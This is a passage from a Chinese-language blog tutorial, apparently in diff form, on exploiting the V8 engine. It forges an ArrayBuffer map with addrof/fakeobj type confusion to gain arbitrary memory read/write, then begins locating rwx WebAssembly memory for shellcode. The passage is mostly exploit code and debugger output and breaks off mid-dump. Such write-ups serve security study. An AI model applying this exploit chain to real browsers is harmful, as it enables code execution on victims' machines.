class="comment">//      |          |   - is_prototype_map (bit 1)                |</span></span><br><span class="line"><span class="comment">//      |          |   - is_in_retained_map_list (bit 2)         |</span></span><br><span class="line"><span class="comment">//      |          |   - elements_kind (bits 3..7)               |</span></span><br><span class="line"><span class="comment">// +----+----------+---------------------------------------------+</span></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>可以伪造一个map，然后改<code>instance_type</code>，这样就能伪造任意类型的object了</p>
+</blockquote>
+<h3 id="伪造object例子🌰"><a href="#伪造object例子🌰" class="headerlink" title="伪造object例子🌰"></a>伪造object例子🌰</h3><p>之前提到ArrayBuffer可以通过改backing store的大小来实现任意地址读写，因此这里可以尝试伪造一个ArrayBuffer,伪造的话肯定需要map*，这里先看一个正常的ArrayBuffer</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ab =<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(ab);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x28f3b7c4e899</span> &lt;<span class="title class_">ArrayBuffer</span> map = <span class="number">0xda8501c21b9</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x28f3b7c4e899</span></span><br><span class="line"><span class="number">0x28f3b7c4e899</span>: [<span class="title class_">JSArrayBuffer</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x0da8501c21b9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x20729294e981</span> &lt;<span class="title class_">Object</span> map = <span class="number">0xda8501c2209</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x37f811f00c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - embedder <span class="attr">fields</span>: <span class="number">2</span></span><br><span class="line"> - <span class="attr">backing_store</span>: <span class="number">0x55879d7411e0</span></span><br><span class="line"> - <span class="attr">byte_length</span>: <span class="number">32</span></span><br><span class="line"> - detachable</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x37f811f00c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    <span class="number">0</span>, aligned <span class="attr">pointer</span>: (nil)</span><br><span class="line">    <span class="number">0</span>, aligned <span class="attr">pointer</span>: (nil)</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x28f3b7c4e899</span>-<span class="number">1</span> <span class="comment">//看看ArrayBuffer</span></span><br><span class="line"><span class="number">0x28f3b7c4e898</span>:	<span class="number">0x00000da8501c21b9</span>(map*)	<span class="number">0x000037f811f00c71</span>(properties)</span><br><span class="line"><span class="number">0x28f3b7c4e8a8</span>:	<span class="number">0x000037f811f00c71</span>(elements)	<span class="number">0x0000000000000020</span>(byte_length)</span><br><span class="line"><span class="number">0x28f3b7c4e8b8</span>:	<span class="number">0x000055879d7411e0</span>(<span class="title class_">BackingStore</span>)	<span class="number">0x0000000000000002</span>(embedder fields)</span><br><span class="line"><span class="number">0x28f3b7c4e8c8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e8d8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e8e8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e8f8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e908</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e918</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x28f3b7c4e928</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x0da8501c21b9</span> </span><br><span class="line"><span class="number">0xda8501c21b9</span>: [<span class="title class_">Map</span>]</span><br><span class="line"> - <span class="attr">type</span>: <span class="variable constant_">JS_ARRAY_BUFFER_TYPE</span></span><br><span class="line"> - instance <span class="attr">size</span>: <span class="number">64</span></span><br><span class="line"> - inobject <span class="attr">properties</span>: <span class="number">0</span></span><br><span class="line"> - elements <span class="attr">kind</span>: <span class="variable constant_">HOLEY_ELEMENTS</span></span><br><span class="line"> - unused property <span class="attr">fields</span>: <span class="number">0</span></span><br><span class="line"> - enum <span class="attr">length</span>: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back <span class="attr">pointer</span>: <span class="number">0x37f811f004d1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line"> - prototype_validity <span class="attr">cell</span>: <span class="number">0x2aff905c0609</span> &lt;<span class="title class_">Cell</span> value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance <span class="title function_">descriptors</span> (own) #<span class="number">0</span>: <span class="number">0x37f811f00259</span> &lt;<span class="title class_">DescriptorArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - layout <span class="attr">descriptor</span>: (nil)</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x20729294e981</span> &lt;<span class="title class_">Object</span> map = <span class="number">0xda8501c2209</span>&gt;</span><br><span class="line"> - <span class="attr">constructor</span>: <span class="number">0x20729294e7e9</span> &lt;<span class="title class_">JSFunction</span> <span class="title class_">ArrayBuffer</span> (sfi = <span class="number">0x2aff905ccff9</span>)&gt;</span><br><span class="line"> - dependent <span class="attr">code</span>: <span class="number">0x37f811f002c1</span> &lt;<span class="title class_">Other</span> heap <span class="title function_">object</span> (<span class="variable constant_">WEAK_FIXED_ARRAY_TYPE</span>)&gt;</span><br><span class="line"> - construction <span class="attr">counter</span>: <span class="number">0</span></span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x0da8501c21b9</span>-<span class="number">1</span> <span class="comment">//看看map</span></span><br><span class="line"><span class="number">0xda8501c21b8</span>:	<span class="number">0x000037f811f00189</span>(一个指向根<span class="title class_">Map</span>的<span class="title class_">Poniter</span>)	<span class="number">0x1900042319080808</span>(包含第一个和第二个int)</span><br><span class="line"><span class="number">0xda8501c21c8</span>:	<span class="number">0x00000000082003ff</span>	<span class="number">0x000020729294e981</span></span><br><span class="line"><span class="number">0xda8501c21d8</span>:	<span class="number">0x000020729294e7e9</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xda8501c21e8</span>:	<span class="number">0x000037f811f00259</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xda8501c21f8</span>:	<span class="number">0x000037f811f002c1</span>	<span class="number">0x00002aff905c0609</span></span><br><span class="line"><span class="number">0xda8501c2208</span>:	<span class="number">0x000037f811f00189</span>	<span class="number">0x1b0004211d060307</span></span><br><span class="line"><span class="number">0xda8501c2218</span>:	<span class="number">0x00000000182013ff</span>	<span class="number">0x0000207292942091</span></span><br><span class="line"><span class="number">0xda8501c2228</span>:	<span class="number">0x00002072929420c9</span>	<span class="number">0x000020729294e9b9</span></span><br><span class="line"><span class="number">0xda8501c2238</span>:	<span class="number">0x000020729294e9f1</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xda8501c2248</span>:	<span class="number">0x000037f811f002c1</span>	<span class="number">0x00002aff905c0609</span></span><br></pre></td></tr></table></figure></div>
+
+<p>之前说过map结构里第二个int值表示type，因此可以直接把<code>0x1900042319080808</code> copy过来，就可以伪造一个ArrayBuffer的map了，其余结构参考上面job的结果</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_array_buffer_obj = [</span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//map*, properties （properties只要不去访问，设置成0也没事）</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x4000</span>), <span class="comment">//elements, length</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">2</span>), <span class="comment">//backing_store, embedder fields</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//padding, padding</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x1900042319080808</span>), <span class="comment">//fake map</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p><code>u2d</code>是前面写的工具function，unsigned int-&gt;double</p>
+<p>这里可以看到<code>map*</code>的位置写的是0，这个是因为我们还不知道我们构造的fake map的具体地址，现在需要把fake map的address leak出来，然后填到<code>map*</code>的位置</p>
+</blockquote>
+<p>那么怎么leak这个fake map的address呢🤔，由于前面构造原语的章节说过，可以利用类型混淆来leak出任意object的address，因此我们可以在运行poc的时候leak出构造的<code>fake_array_buffer_obj</code>的地址，之后只要加上构造的<code>fake map</code>相对于<code>fake_array_buffer_obj</code>的偏移就可以了。</p>
+<p>那么怎么获得这个偏移🤔其实我们构造的<code>fake_array_buffer_obj</code>实质上是一个JSArray，回顾一下之前说的JSArray的结构，后面存储的元素其实是在FixedArray的Elements中，而Elements相对于JSArray头的偏移其实是**<u>固定</u>**的</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[&quot;Pointer (63 bit) | 1&quot;] --&gt; B[JSArray]</span><br><span class="line">    B --&gt; C[Map*]</span><br><span class="line">    B --&gt; D[Properties*]</span><br><span class="line">    B --&gt; E[Elements*]</span><br><span class="line">    B --&gt; F[Length]</span><br><span class="line">    E --&gt; G[FixedArray]</span><br><span class="line">    G --&gt; H[Map*]</span><br><span class="line">    G --&gt; I[Length]</span><br><span class="line">    G --&gt; J[&quot;Elements[0]&quot;]</span><br><span class="line">    G --&gt; K[&quot;Elements[1]&quot;]</span><br><span class="line">    G --&gt; M[&quot;....&quot;]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="计算fake-map偏移"><a href="#计算fake-map偏移" class="headerlink" title="计算fake map偏移"></a>计算fake map偏移</h3><p>首先看一下构造的fakeobj</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_array_buffer_obj = [</span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//map*, properties （properties只要不去访问，设置成0也没事）</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x4000</span>), <span class="comment">//elements, length</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">2</span>), <span class="comment">//backing_store, embedder fields</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//padding, padding</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x1900042319080808</span>), <span class="comment">//fake map</span></span><br><span class="line">];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(fake_array_buffer_obj);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x033dc42cad71</span> &lt;<span class="title class_">JSArray</span>[<span class="number">10</span>]&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x033dc42cad71</span> <span class="comment">//看看JSArray</span></span><br><span class="line"><span class="number">0x33dc42cad71</span>: [<span class="title class_">JSArray</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x357201fc2ed9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x34e472dd1111</span> &lt;<span class="title class_">JSArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x033dc42cada9</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">10</span>]&gt; [<span class="variable constant_">PACKED_DOUBLE_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">10</span></span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x2c40d2940c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #<span class="attr">length</span>: <span class="number">0x1aa9ac5c01a9</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x033dc42cada9</span> &lt;<span class="title class_">FixedDoubleArray</span>[<span class="number">10</span>]&gt; &#123;</span><br><span class="line">         <span class="number">0</span>-<span class="number">2</span>: <span class="number">0</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">8.09477e-320</span></span><br><span class="line">           <span class="number">4</span>: <span class="number">0</span></span><br><span class="line">           <span class="number">5</span>: <span class="number">9.88131e-324</span></span><br><span class="line">         <span class="number">6</span>-<span class="number">8</span>: <span class="number">0</span></span><br><span class="line">           <span class="number">9</span>: <span class="number">2.87575e-188</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/20gx <span class="number">0x033dc42cada9</span>-<span class="number">1</span> <span class="comment">//看看elements</span></span><br><span class="line"><span class="number">0x33dc42cada8</span>:	<span class="number">0x00002c40d29414f9</span>(map*)	<span class="number">0x0000000a00000000</span>(length)</span><br><span class="line"><span class="number">0x33dc42cadb8</span>:	<span class="number">0x0000000000000000</span>(<span class="title class_">Elements</span>[<span class="number">0</span>])	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33dc42cadc8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000004000</span></span><br><span class="line"><span class="number">0x33dc42cadd8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000002</span></span><br><span class="line"><span class="number">0x33dc42cade8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33dc42cadf8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x1900042319080800</span>(fake map🌟)</span><br><span class="line"><span class="number">0x33dc42cae08</span>:	<span class="number">0x00002c40d2940139</span>	<span class="number">0x000351f800000000</span></span><br><span class="line"><span class="number">0x33dc42cae18</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33dc42cae28</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33dc42cae38</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x33dc42cadb8</span>-<span class="number">0x33dc42cad70</span></span><br><span class="line">$2 = <span class="number">0x48</span></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>可以看到Elements相对于JSArray头的偏移是0x48，所以再加上fake map相对于Elements的偏移(4x16&#x3D;64)就得到了fake map相对于JSArray的偏移\</p>
+</blockquote>
+<p>这样就可以构造一个ArrayBuffer了</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_array_buffer_obj = [</span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//map*, properties （properties只要不去访问，设置成0也没事）</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x4000</span>), <span class="comment">//elements, length</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">2</span>), <span class="comment">//backing_store, embedder fields</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//padding, padding</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x1900042319080808</span>), <span class="comment">//fake map 这步很关键，如果没改对map。后续利用fakeobj返回的object类型就不会是ArrayBuffer</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">let</span> fake_obj_elements_addr = <span class="title function_">addrof</span>(fake_array_buffer_obj) + <span class="number">0x48</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake obj elements addr is:&quot;</span>+<span class="title function_">hex</span>(fake_obj_elements_addr));</span><br><span class="line"><span class="keyword">let</span> array_buffer_obj_map_addr = fake_obj_elements_addr + <span class="number">64</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake array buffer&#x27;s map addr is:&quot;</span>+<span class="title function_">hex</span>( array_buffer_obj_map_addr));</span><br><span class="line">fake_array_buffer_obj[<span class="number">0</span>]=<span class="title function_">u2d</span>(array_buffer_obj_map_addr);<span class="comment">//fake map的地址替换</span></span><br><span class="line"><span class="keyword">let</span> fake_array_buffer = <span class="title function_">fakeobj</span>(<span class="title function_">u2d</span>(fake_obj_elements_addr));<span class="comment">//fake obj会利用类型混淆，把传入的地址当作HeapObject Pointer解析</span></span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_array_buffer); <span class="comment">//利用ArrayBuffer创建一个DataView实现任意地址读写</span></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>可以把DataVeiw理解成是用来读写传入的ArrayBuffer的backing store中的值的，而我们再构造ArrayBuffer时，把backing store的长度被我们改得很大(0x4000)，所以可以实现任意地址读写</p>
+</blockquote>
+<h3 id="wasm写shellcode"><a href="#wasm写shellcode" class="headerlink" title="wasm写shellcode"></a>wasm写shellcode</h3><p>web assembly创建的Instance附近有一块权限为rwx的内存，可以写入shellcode，这块内存相对于Instance的偏移也是固定的，现在我们来找一下这个偏移</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,<span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>,<span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]); <span class="comment">//一个简单的main函数</span></span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);<span class="comment">//创建模块</span></span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);<span class="comment">//实例化</span></span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;<span class="comment">//获得导出函数</span></span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasm_instance);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x17f0cf121831</span> &lt;<span class="title class_">Instance</span> map = <span class="number">0x1ac3290c9789</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x17f0cf121831</span></span><br><span class="line"><span class="number">0x17f0cf121831</span>: [<span class="title class_">WasmInstanceObject</span>] <span class="keyword">in</span> <span class="title class_">OldSpace</span></span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x1ac3290c9789</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x19ccc870a379</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1ac3290cabd9</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x03ea86480c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">module_object</span>: <span class="number">0x148cb2f00d31</span> &lt;<span class="title class_">Module</span> map = <span class="number">0x1ac3290c91e9</span>&gt;</span><br><span class="line"> - <span class="attr">exports_object</span>: <span class="number">0x148cb2f00f69</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x1ac3290cad19</span>&gt;</span><br><span class="line"> - <span class="attr">native_context</span>: <span class="number">0x17f0cf101869</span> &lt;<span class="title class_">NativeContext</span>[<span class="number">246</span>]&gt;</span><br><span class="line"> - <span class="attr">memory_object</span>: <span class="number">0x17f0cf121959</span> &lt;<span class="title class_">Memory</span> map = <span class="number">0x1ac3290ca189</span>&gt;</span><br><span class="line"> - table <span class="number">0</span>: <span class="number">0x148cb2f00f01</span> &lt;<span class="title class_">Table</span> map = <span class="number">0x1ac3290c9aa9</span>&gt;</span><br><span class="line"> - <span class="attr">imported_function_refs</span>: <span class="number">0x03ea86480c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="attr">managed_native_allocations</span>: <span class="number">0x148cb2f00ea9</span> &lt;<span class="title class_">Foreign</span>&gt;</span><br><span class="line"> - <span class="attr">memory_start</span>: <span class="number">0x7f1504000000</span></span><br><span class="line"> - <span class="attr">memory_size</span>: <span class="number">65536</span></span><br><span class="line"> - <span class="attr">memory_mask</span>: ffff</span><br><span class="line"> - <span class="attr">imported_function_targets</span>: <span class="number">0x55b83d59f480</span></span><br><span class="line"> - <span class="attr">globals_start</span>: (nil)</span><br><span class="line"> - <span class="attr">imported_mutable_globals</span>: <span class="number">0x55b83d59eaf0</span></span><br><span class="line"> - <span class="attr">indirect_function_table_size</span>: <span class="number">0</span></span><br><span class="line"> - <span class="attr">indirect_function_table_sig_ids</span>: (nil)</span><br><span class="line"> - <span class="attr">indirect_function_table_targets</span>: (nil)</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x03ea86480c71</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; &#123;&#125;</span><br><span class="line">pwndbg&gt; x/80gx <span class="number">0x17f0cf121831</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x17f0cf121830</span>:	<span class="number">0x00001ac3290c9789</span>	<span class="number">0x000003ea86480c71</span></span><br><span class="line"><span class="number">0x17f0cf121840</span>:	<span class="number">0x000003ea86480c71</span>	<span class="number">0x00007f1504000000</span></span><br><span class="line"><span class="number">0x17f0cf121850</span>:	<span class="number">0x0000000000010000</span>	<span class="number">0x000000000000ffff</span></span><br><span class="line"><span class="number">0x17f0cf121860</span>:	<span 